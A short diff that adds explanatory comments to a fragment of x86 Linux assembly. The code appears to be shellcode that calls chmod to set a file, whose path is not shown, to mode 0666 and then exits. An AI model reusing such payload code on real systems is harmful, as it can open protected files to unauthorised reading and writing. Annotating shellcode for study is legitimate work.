@@ -34,6 +34,9 @@ global _start
 section .text
 
 _start:
+
+	; int chmod(const char *path, mode_t mode);
+
 	xor ecx, ecx
 	mul ecx	
 	mov al, 15
@@ -44,6 +47,8 @@ _start:
 	mov ebx, esp
 	mov cx, 0x1b6
 	int 0x80
+
+	; void _exit(int status);
 
 	inc edx
 	xchg eax, edx
